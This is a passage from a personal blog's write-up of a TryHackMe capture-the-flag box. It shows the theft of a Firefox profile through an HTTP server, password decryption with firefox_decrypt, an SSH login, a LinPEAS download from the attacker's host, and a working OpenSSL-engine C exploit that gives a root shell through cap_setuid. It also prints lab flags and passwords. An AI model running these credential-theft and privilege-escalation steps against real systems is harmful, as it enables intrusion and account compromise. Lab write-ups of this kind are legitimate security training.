<p>In Linux the main Firefox profile folder that stores personal data is in the hidden “~&#x2F;.mozilla&#x2F;firefox&#x2F;” folder.</p>
<h2 id="Extracting-the-credentials"><a href="#Extracting-the-credentials" class="headerlink" title="Extracting the credentials"></a>Extracting the credentials</h2><p>Zip the entire mozilla directory</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">zip /tmp/system-mozilla.zip .mozilla -r</code></pre>

<p>Start a python3 server on the attacked machine :</p>
<pre><code class="hljs bash">$ python3 -m http.server 8081</code></pre>

<p>Get the file with wget:</p>
<pre><code class="hljs bash">└─$ wget http://10.10.225.111:8081/system-mozilla.zip
--2024-07-23 10:10:22--  http://10.10.225.111:8081/system-mozilla.zip
Connecting to 10.10.225.111:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8079868 (7.7M) [application/zip]
Saving to: ‘system-mozilla.zip’

system-mozilla.zip                           100%[==============================================================================================&gt;]   7.71M  8.86MB/s    <span class="hljs-keyword">in</span> 0.9s    

2024-07-23 10:10:23 (8.86 MB/s) - ‘system-mozilla.zip’ saved [8079868/8079868]</code></pre>

<p>None of the user profiles had login except “2fjnrwth.default-release”</p>
<p><img src="/../vulnnet_img/16.png" alt="alt text"></p>
<p>Now checking the profile.ini file, it does not have the “2fjnrwth.default-release” profile as shown below.</p>
<p>Change one of them to “2fjnrwth.default-release” </p>
<p><img src="/../vulnnet_img/17.png" alt="alt text"></p>
<p> Extract the credentials with firefox_decryptor tool</p>
<p>→ Run the exploit</p>
<pre><code class="hljs bash">└─$ python3 firefox_decrypt/firefox_decrypt.py .mozilla/firefox</code></pre>

<p><img src="/../vulnnet_img/18.png" alt="alt text"></p>
<p>CREDS:</p>
<p>Website:   <a target="_blank" rel="noopener" href="https://tryhackme.com/">https://tryhackme.com</a><br>Username: ‘<a href="mailto:&#99;&#x68;&#x72;&#x69;&#x73;&#95;&#119;&#x40;&#118;&#117;&#x6c;&#x6e;&#110;&#101;&#116;&#x2e;&#x74;&#x68;&#x6d;">&#99;&#x68;&#x72;&#x69;&#x73;&#95;&#119;&#x40;&#118;&#117;&#x6c;&#x6e;&#110;&#101;&#116;&#x2e;&#x74;&#x68;&#x6d;</a>‘<br>Password: ‘8y7TKQDpucKBYhwsb’</p>
<h2 id="SSH-system-user"><a href="#SSH-system-user" class="headerlink" title="SSH system user"></a>SSH system user</h2><p>Logging in with SSH as a system user involves securely accessing a remote system by using the SSH (Secure Shell) protocol and providing the system user’s credentials.</p>
<p>Log in with ssh with the credentials we just found</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">└─$ ssh system@10.10.225.111</code></pre>

<p>→</p>
<p><img src="/../vulnnet_img/19.png" alt="alt text"></p>
<h3 id="Uploading-LinPEAS"><a href="#Uploading-LinPEAS" class="headerlink" title="Uploading LinPEAS"></a>Uploading LinPEAS</h3><p><strong>LinPEAS</strong> is a script used in penetration testing to automate the process of enumerating possible paths to escalate privileges on a Linux system.</p>
<p>Start a python3 http.server on your machine and download linpeas in the attacked machine with wget or curl:</p>
<ul>
<li>command used:</li>
</ul>
<pre><code class="hljs bash">wget http://10.9.2.254:8000/linpeas.sh</code></pre>

<p>Change execute permissions to linpeas and run it:</p>
<pre><code class="hljs bash">system@vulnnet-endgame:/tmp$ <span class="hljs-built_in">chmod</span> +x linpeas.sh
system@vulnnet-endgame:/tmp$ ./linpeas.sh</code></pre>

<p>Linpeas found we have cap_setuid capability and library load feature in OpenSSL</p>
<p><img src="/../vulnnet_img/20.png" alt="alt text"></p>
<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>To exploit this, create an ‘exploit.c’ file with this content:</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/engine.h&gt;</span></span>

<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(ENGINE *e, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *id)</span>
&#123;
  setuid(<span class="hljs-number">0</span>); setgid(<span class="hljs-number">0</span>);
  system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);
&#125;

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()</code></pre>

<p>Run the following:</p>
<pre><code class="hljs c">gcc -fPIC -o exploit.o -c exploit.c
gcc -shared -o exploit.so -lcrypto exploit.o</code></pre>

<p>→</p>
<p><img src="/../vulnnet_img/21.png" alt="alt text"></p>
<p>Upload the <a target="_blank" rel="noopener" href="http://exploit.so/">exploit.so</a> to the attacked machine:</p>
<pre><code class="hljs c">wget http:<span class="hljs-comment">//10.9.2.254:8000/exploit.so</span></code></pre>

<p>→</p>
<p><img src="/../vulnnet_img/22.png" alt="alt text"></p>
<pre><code class="hljs c">chmod +x exploit.so</code></pre>

<p>Run the exploit and get root:</p>
<pre><code class="hljs c">/home/system/Utils/openssl req -engine ./exploit.so</code></pre>

<p><img src="/../vulnnet_img/23.png" alt="alt text"></p>
<pre><code class="hljs c">root@vulnnet-endgame:~<span class="hljs-meta"># cat user.txt</span>
THM&#123;fb84e79072015186c72ec77ded49a5ff&#125;</code></pre>

<pre><code class="hljs c">root@vulnnet-endgame:/root/thm-flag<span class="hljs-meta"># cat root.txt </span>
THM&#123;<span class="hljs-number">1</span>d42edbb03c0b287a8d0d8a265dce012&#125;</code></pre>

<p>Pass of the CMS: <code>vAxWtmNzeTz</code></p>
<p>User flag: <strong><code>THM&#123;fb84e79072015186c72ec77ded49a5ff&#125;</code></strong></p>
<p>Root flag: <strong><code>THM&#123;1d42edbb03c0b287a8d0d8a265dce012&#125;</code></strong></p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2024/07/31/Creative/" title="Creative"><span class="has-text-weight-semibold">Next: Creative</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/razvan-popa-333740293"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Rãzvan 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>